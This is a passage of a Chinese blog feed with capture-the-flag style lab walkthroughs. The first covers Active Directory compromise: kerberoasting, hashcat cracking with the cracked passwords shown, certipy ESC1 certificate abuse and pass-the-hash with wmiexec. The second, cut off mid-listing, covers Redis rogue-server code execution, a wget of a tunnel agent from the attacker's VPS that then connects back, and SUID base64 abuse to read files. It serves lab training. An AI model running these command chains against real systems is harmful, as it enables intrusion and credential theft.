class="variable">$c700399dc4efc1b9812c888c78daa853c9563f05f67bbb0232d1f6505cdb2e2019ee4de1320785112c0a6f874575ebdb26e5ec8f12351903957e5df25a9fa9205e73c07d6e44588a6c316a9a73cefb4428f834fd70d7e1aa043f91f1c90de8fe6ed871f0cbb4f59a95411fc639a6d7f7a0206006eb2a20ec46d7ed8cf77b05a1b41230b859cac548169cd82a67972160ffcd78e64e0b4b23d7dca1afb99756b474ceea25a7d2bd9c8113c4e33525bd7ea83e75fb482fc113ad34d9be9814d6baf97b5dc060b1a0eb427a727d723a21e84f3fa172598d2be1220573dcaa5a8cc00b397cb5777daf30767261c3062377003b326f2fae6b9b2a9b7ce588b352037bda27b2dfd298e467915c297638244815693345e4bb82881e89d776becdac84209de2770181649c8d7829c3215216afd4d042ae7a4520e20f8e2fe0cec12f1fc51382cc5c69a084a4e63ad85b83a55f986758d79d7dae3f2ca872db411011747e0aa703ce28a236062497a01838609e4e15e25b70e4894b37eab950398ae9670a2bcde281e75ccd40bcfb48de62ce0ed88229827050b6c62b28b52756f15e3609cf9e51487ca3f8b1794a01a2ceeedb34a94348da8e2c955cd51ff05d3bbcbd8c489eb041658e2da7bcc53322016144f488b27c68105312dd3797488f9901283bcbae2d8d04212e78bf474f6f7214b0fbc4b8db6355d14939c9aa85fdf637fdd2b6aa1b05f78802a69023d4f10653438f339daefad98b2eca06758bcbeb1d87b980fca932b05e19e51918bb8eadfd8bf0bd1ad94f4e751355d28b2d6213fc934bee887d1c82d9654439f4557559c83f8be66098cef1bd2ab7c4153131c5c9cd338f3bccfcd8b089605f9620240fa052891a4ca604b5277e5f1f1d3bae7747a7a0cf4c00b0b4b87fb6f1483c987e44f1f431bff78687e1ab490e641bddc9bf3fc0bf5d066ac79993265e4309064f2b9a1a5108409c29d1073d92efe6c629d609f7fcc9c349f850d3ce470ba428ab3c7dcf256a9013c2993f737bc27465aa42e622b7836280e3d8d0f04e6c87616dd6d2d39fa58af06ad3d711f368d8793fe56d99563e45d11ac9f6f53bf7a91f01a745136ff8514aedb0df978c28626ecce4ce0c3314a303443f20d93e0f9feacb9ef76d88860280909078867ac8200ce469c08c2390a79cbbab87fd78bdd3276f3954fa42fc46e570e8737ec541ac45adc220a176169701238639dcc257cb7e49e5f3a5827fc4640d32eadcabd59e779defc40f3d3d041653f8ac2e3086be3cb27f417ffacbc2f76c623ed4af356c6a60b9d11bd6b966e9de3f1ecac3b1c1a3c808157cdb766d1ce0ec26ede5f0f6a915d2fad7fb323f554c47c81fa6eaeca35bb424977aa07748d75b7397e59574d99ed624062d03684a3457bfe80befd4d7aec819d45c9f4eb34eb6c28fccbf96182f7f41489e806c0200f02802719d2ad15330b29f7174506992d314826fc3bb083711ca71b5b0693a0ad8aaf8bd45a0eb142a</span></span><br></pre></td></tr></table></figure><p>拿到两个用户的 TGS-REP(ST)，zhangxia 26机子上的用户</p><p>对该导出的ST尝试 hashcat 爆破密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*zhangxia<span class="variable">$XIAORANG</span>.LAB<span class="variable">$xiaorang</span>.lab/zhangxia*<span class="variable">$bc05ad7b3883ce626adb11f043475f8e</span><span class="variable">$e2272d593ccc87927c73e67d1d458d64275645192dbfb53e1898f39d91886fefb0ff22379732a657003a7ee06eb916ebf1d978d8a2a4824e8b120ce993b2f81a4df772ebeae9a98dd764fd445596fa6336e8177708262311095e9f346e94f2ddf4653198d53f489d1287e2ef73dfa2666e2fb4d8a5715728da341985eedf425b24213a1f776c300a67254a5857f7d3b696afd7b127174f1f33107b555fcd94ceab26ed5a872c972af0d691e57a5fa8b93a63ec70e0205ced76b090642f3cf1e137406cca103e57bab87aed8375bc541382768d96c824c38c34d7d9b19e1776718a249f337ab837b90509c1c662d14d5c301e6c826ac3effa73e0452b6541a7b0a343c19399c52f5d323defff7cedaeea23647b4b6733a2bba5df123511824336b7d67dd9945ed4186ec65692766c677eda1e23a64aa49bf8d325fc84381a190bce138b82502a1dbae70da4ea2c56aac5bc1fa1e80bf870df076027c386b1b51762d0aee0ecaafc73bb22633c05fd1aed68ec6e31ea105ccd162a27a0e1dbee9c9872c14223af8d51991a71b2b1b48871655659866f66f9859b204571992a90482711262342b42a59c13f974899c244c4f150cd8c98ee39ef5d3ec1d18155e8e12fb249460c60555415407bca5a6857e41f31edf776170d57f692cff3cd8fbd02c9613191d7ca61b62c5d88522b3f6f96fcb493f1e29cefcceb5f523e80e13c204f5e62a1f9d5b1ed2aafd67b19f8114a862c87d4fb55a816906306520a83edc3eef9c88716d0cc60ccba0c6f96bf7a7556f7f501d131ad08c11de78ed9fe2ca25c6971dd35ad4ab456692f2b1541d84b112615a22b380dbe7cdee403c33e2c3f46ac1b3c2a9fc4d8e941543ad928d51ae461805da03821ac60ac368a059ca6487964a79999fb6c1c84dc805a3d527a107694f8f3fab382fda419ee2fac2ac476bc95fc023c5776574264da7f309a321e5e669ed818a95e444087301a83fafd58cab1f8e488e839bf22e40a57480ee564e2369e592dccfb2b27cf7e2579395e2aadceb5bfb6f077bdf7abea7e4a82f02484fdfa68088161cb8bfba237ebb5e3030cd9cb8c80abee2ee450e4d438c710fc5f3af8f0926b215fe6d7c91251db44804b4d3c53488fe6621645479aee83cb29989e8009a0c516db11dc8dc818774604ff6c2274d7c0fb4747b57f463ac805d4674f91d8abb501fd66892952783b019da9e5dc177a63d8e38a6ce0d000f84fa8caff97a38b49625d216452152712a338d94bb706cb59265b7317b943816b5f37f4dfb2c4de2456f2ae16fd92d9cde9ae93b928c96a3c6e749881402957dc59a5d5370720c560aa0bdfbff4e66520ea32f08fd8147e7d869042933d8bf1ba254672ec9dc94e730fe5cdf78ab92b5d49352a3455ad9b5f179afd4c0e8231315c75bae6968c02c3daeb1db04ed6a211197e6b69e25daa3b153dc816c5732c1c2d0f2eff1259e704d6431cb010126b1d97da6ecd0d85ad550bda989de2b88a30</span></span><br><span class="line"><span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*chenchen<span class="variable">$XIAORANG</span>.LAB<span class="variable">$xiaorang</span>.lab/chenchen*<span class="variable">$2b7c680abb7c3d12c8529687a117d1bf</span><span class="variable">$c700399dc4efc1b9812c888c78daa853c9563f05f67bbb0232d1f6505cdb2e2019ee4de1320785112c0a6f874575ebdb26e5ec8f12351903957e5df25a9fa9205e73c07d6e44588a6c316a9a73cefb4428f834fd70d7e1aa043f91f1c90de8fe6ed871f0cbb4f59a95411fc639a6d7f7a0206006eb2a20ec46d7ed8cf77b05a1b41230b859cac548169cd82a67972160ffcd78e64e0b4b23d7dca1afb99756b474ceea25a7d2bd9c8113c4e33525bd7ea83e75fb482fc113ad34d9be9814d6baf97b5dc060b1a0eb427a727d723a21e84f3fa172598d2be1220573dcaa5a8cc00b397cb5777daf30767261c3062377003b326f2fae6b9b2a9b7ce588b352037bda27b2dfd298e467915c297638244815693345e4bb82881e89d776becdac84209de2770181649c8d7829c3215216afd4d042ae7a4520e20f8e2fe0cec12f1fc51382cc5c69a084a4e63ad85b83a55f986758d79d7dae3f2ca872db411011747e0aa703ce28a236062497a01838609e4e15e25b70e4894b37eab950398ae9670a2bcde281e75ccd40bcfb48de62ce0ed88229827050b6c62b28b52756f15e3609cf9e51487ca3f8b1794a01a2ceeedb34a94348da8e2c955cd51ff05d3bbcbd8c489eb041658e2da7bcc53322016144f488b27c68105312dd3797488f9901283bcbae2d8d04212e78bf474f6f7214b0fbc4b8db6355d14939c9aa85fdf637fdd2b6aa1b05f78802a69023d4f10653438f339daefad98b2eca06758bcbeb1d87b980fca932b05e19e51918bb8eadfd8bf0bd1ad94f4e751355d28b2d6213fc934bee887d1c82d9654439f4557559c83f8be66098cef1bd2ab7c4153131c5c9cd338f3bccfcd8b089605f9620240fa052891a4ca604b5277e5f1f1d3bae7747a7a0cf4c00b0b4b87fb6f1483c987e44f1f431bff78687e1ab490e641bddc9bf3fc0bf5d066ac79993265e4309064f2b9a1a5108409c29d1073d92efe6c629d609f7fcc9c349f850d3ce470ba428ab3c7dcf256a9013c2993f737bc27465aa42e622b7836280e3d8d0f04e6c87616dd6d2d39fa58af06ad3d711f368d8793fe56d99563e45d11ac9f6f53bf7a91f01a745136ff8514aedb0df978c28626ecce4ce0c3314a303443f20d93e0f9feacb9ef76d88860280909078867ac8200ce469c08c2390a79cbbab87fd78bdd3276f3954fa42fc46e570e8737ec541ac45adc220a176169701238639dcc257cb7e49e5f3a5827fc4640d32eadcabd59e779defc40f3d3d041653f8ac2e3086be3cb27f417ffacbc2f76c623ed4af356c6a60b9d11bd6b966e9de3f1ecac3b1c1a3c808157cdb766d1ce0ec26ede5f0f6a915d2fad7fb323f554c47c81fa6eaeca35bb424977aa07748d75b7397e59574d99ed624062d03684a3457bfe80befd4d7aec819d45c9f4eb34eb6c28fccbf96182f7f41489e806c0200f02802719d2ad15330b29f7174506992d314826fc3bb083711ca71b5b0693a0ad8aaf8bd45a0eb142a</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat <span class="literal">-m</span> <span class="number">13100</span> <span class="literal">-a</span> <span class="number">0</span> <span class="number">1</span>.txt rockyou.txt <span class="literal">--force</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/22.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/23.png"></p><p>爆破出来账号密码为</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangxia@xiaorang.lab:MyPass2<span class="selector-tag">@</span>@<span class="number">6</span></span><br><span class="line">chenchen:@Passw0<span class="built_in">rd</span><span class="selector-tag">@</span></span><br></pre></td></tr></table></figure><p>直接rdp172.22.9.26</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/24.png"></p><p>但是发现读取不了flag</p><p>那么我们需要提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">9.7</span> XIAORANG<span class="literal">-DC</span>.xiaorang.lab</span><br><span class="line"></span><br><span class="line"><span class="number">39.99</span>.<span class="number">148.57</span>  <span class="number">172.22</span>.<span class="number">9.19</span>  http://<span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span>/ <span class="number">172.22</span>.<span class="number">9.19</span> 跳板机 solr 已拿下</span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.26</span> DESKTOP<span class="literal">-CBKTVMO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.13</span> CA01.xiaorang.lab</span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.47</span> fileserver  smb vulnerable 详情:password=<span class="number">123456</span>, <span class="built_in">type</span>=weak<span class="literal">-password</span>, port=<span class="number">445</span>, service=smb, username=administrator</span><br></pre></td></tr></table></figure><p>结合题目Certify </p><p>我们猜测是不是ADCS</p><p>用脚本探测一下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy<span class="literal">-ad</span> find <span class="literal">-u</span> <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span> <span class="literal">-password</span> <span class="string">&#x27;MyPass2@@6&#x27;</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">9.7</span> <span class="literal">-vulnerable</span> <span class="literal">-timeout</span> <span class="number">30</span> <span class="literal">-debug</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy find <span class="literal">-u</span> <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span> <span class="literal">-password</span> <span class="string">&#x27;MyPass2@@6&#x27;</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">9.7</span> <span class="literal">-vulnerable</span> <span class="literal">-timeout</span> <span class="number">30</span> <span class="literal">-stdout</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/25.png"></p><p>扫出ESC1</p><blockquote><p>ESC1是指证书模板允许客户端身份验证并允许登记者提供任意主题备用名称，允许普通用户注册证书，根据存在漏洞的证书模板请求域管证书。</p></blockquote><p>记得配置一下，不然会过时</p><p>CA和DC都要配置</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/26.png"></p><p>原本ESC1是要自己用system用户创建一个新的域用户打的</p><p>但是这里我们直接有了一个域用户了，已经满足条件了</p><p>那么我们就直接打吧</p><p>请求域管证书</p><p>&#x2F;&#x2F;-ca：指定证书颁发机构（CA）的名称，这里是 ‘xiaorang-XIAORANG-DC-CA’</p><p>&#x2F;&#x2F;-template：指定要使用的证书模板，这里是 ‘XR Manager’。</p><p>&#x2F;&#x2F;-upn：指定用户主体名称（UPN），这里是 ‘<a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x69;&#115;&#x74;&#114;&#97;&#x74;&#x6f;&#114;&#64;&#120;&#x69;&#97;&#x6f;&#114;&#x61;&#110;&#x67;&#46;&#x6c;&#x61;&#x62;">&#97;&#100;&#x6d;&#105;&#x6e;&#x69;&#115;&#x74;&#114;&#97;&#x74;&#x6f;&#114;&#64;&#120;&#x69;&#97;&#x6f;&#114;&#x61;&#110;&#x67;&#46;&#x6c;&#x61;&#x62;</a>‘。</p><p>-target 为ADCS服务器的ip</p><p>但是不知道为什么，下面我一开始填的是DC也成功了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> certipy req <span class="literal">-u</span> <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span> <span class="literal">-p</span> <span class="string">&#x27;MyPass2@@6&#x27;</span> <span class="literal">-target</span> <span class="number">172.22</span>.<span class="number">9.7</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">9.7</span> <span class="literal">-ca</span> <span class="string">&#x27;xiaorang-XIAORANG-DC-CA&#x27;</span> <span class="literal">-template</span> <span class="string">&#x27;XR Manager&#x27;</span> <span class="literal">-upn</span> <span class="string">&#x27;administrator@xiaorang.lab&#x27;</span></span><br><span class="line"></span><br><span class="line">proxychains4 <span class="literal">-q</span> certipy req <span class="literal">-u</span> <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span> <span class="literal">-p</span> <span class="string">&#x27;MyPass2@@6&#x27;</span> <span class="literal">-target</span> <span class="number">172.22</span>.<span class="number">9.13</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">9.7</span> <span class="literal">-ca</span> <span class="string">&#x27;xiaorang-XIAORANG-DC-CA&#x27;</span> <span class="literal">-template</span> <span class="string">&#x27;XR Manager&#x27;</span> <span class="literal">-upn</span> <span class="string">&#x27;administrator@xiaorang.lab&#x27;</span></span><br></pre></td></tr></table></figure><p>打两次就ok了</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/27.png"></p><p><font style="color:rgb(77, 77, 77);">然后用生成的administrator.pfx获取TGT票据和域管理员的NTLM哈希</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy auth <span class="literal">-pfx</span> administrator.pfx <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">9.7</span> <span class="literal">-debug</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">impacket</span>/<span class="type">examples</span>]</span><br><span class="line">└─<span class="comment"># proxychains4 certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7 -debug</span></span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains4.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">Certipy v4.<span class="number">8.2</span> - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> principal: administrator@xiaorang.lab</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.22</span>.<span class="number">9.7</span>:<span class="number">88</span>  ...  OK</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT hash <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.22</span>.<span class="number">9.7</span>:<span class="number">88</span>  ...  OK</span><br><span class="line">[*] Got hash <span class="keyword">for</span> <span class="string">&#x27;administrator@xiaorang.lab&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:<span class="number">2</span>f1b57eefb2d152196836b0516abea80</span><br><span class="line">                                                                                                                       </span><br></pre></td></tr></table></figure><p>接下来就是PTH横向了</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/28.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples\wmiexec.py xiaorang.lab/Administrator@<span class="number">172.22</span>.<span class="number">9.7</span>  <span class="literal">-hashes</span> <span class="number">00000000000000000000000000000000</span>:<span class="number">2</span>f1b57eefb2d152196836b0516abea80 <span class="built_in">type</span> Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/29.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">9.7</span> XIAORANG<span class="literal">-DC</span>.xiaorang.lab   拿下</span><br><span class="line"></span><br><span class="line"><span class="number">39.99</span>.<span class="number">148.57</span>  <span class="number">172.22</span>.<span class="number">9.19</span>  http://<span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span>/ <span class="number">172.22</span>.<span class="number">9.19</span> 跳板机 solr 已拿下</span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.26</span> DESKTOP<span class="literal">-CBKTVMO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.13</span> CA01.xiaorang.lab</span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.47</span> fileserver  smb vulnerable 详情:password=<span class="number">123456</span>, <span class="built_in">type</span>=weak<span class="literal">-password</span>, port=<span class="number">445</span>, service=smb, username=administrator</span><br></pre></td></tr></table></figure><p>域控是flag4</p><p>那么剩下的一个肯定在26了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py xiaorang.lab/Administrator@<span class="number">172.22</span>.<span class="number">9.26</span>  <span class="literal">-hashes</span> <span class="number">00000000000000000000000000000000</span>:<span class="number">2</span>f1b57eefb2d152196836b0516abea80 <span class="literal">-codec</span> gbk</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/30.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/31.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Brute4road</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p>目标ip</p><p>信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.99.232.242</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  ______                   _____  _</span><br><span class="line"> |  ____|                 |  __ \| |</span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___</span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/</span><br><span class="line">                     fscan version: 1.8.4 TeamdArk5 v1.0</span><br><span class="line">start infoscan</span><br><span class="line">39.99.232.242:6379 open</span><br><span class="line">39.99.232.242:21 open</span><br><span class="line">39.99.232.242:22 open</span><br><span class="line">39.99.232.242:80 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.232.242      code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[+] ftp 39.99.232.242:21:anonymous</span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[+] Redis 39.99.232.242:6379 unauthorized file:/usr/local/redis/db/dump.rdb</span><br><span class="line">已完成 4/4</span><br><span class="line">[*] 扫描结束,耗时: 44.9886764s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/2.png"></p><p>增强版mdut直接连接</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/3.png"></p><p>显示可以使用主从复制rce</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/4.png"></p><p>使用这里报错</p><p>那么用脚本试试吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 39.99.232.242 --lhost 47.113.229.136 </span><br><span class="line"></span><br><span class="line"><span class="comment">#重置了n次</span></span><br><span class="line">python3 redis-rogue-server.py --rhost 39.99.157.234 --lhost 47.113.229.136 </span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/5.png"></p><p>在vps直接运行</p><p>可以获取一个交互式的shell</p><p>但是这里不太好看，那么我先传stow</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vps</span></span><br><span class="line">./linux_x64_admin -l 1122</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机</span></span><br><span class="line">wget http://47.113.229.136:8080/stowaway_linux/linux_x64_agent</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x linux_x64_agent</span><br><span class="line"></span><br><span class="line">./linux_x64_agent -c 47.113.229.136:1122</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/6.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/7.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/8.png"></p><p>这样就是连接成功了，搭建socks隧道，打开proxifier就可以了</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/9.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/10.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里也可以拿个更好看的伪交互式shell</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/11.png"></p><p>没有权限，接下来就提权吧</p><p>前面看见是linux</p><p>就不打内核了，先看看sudo suid，配置利用，应用服务</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/12.png"></p><p>先看看suid吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/usernetctl</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/base64</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就直接利用base64吧</p><p>不知道可以直接拿这些问ai</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/13.png"></p><p>不能直接提权，但是可以读文件</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/14.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/15.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 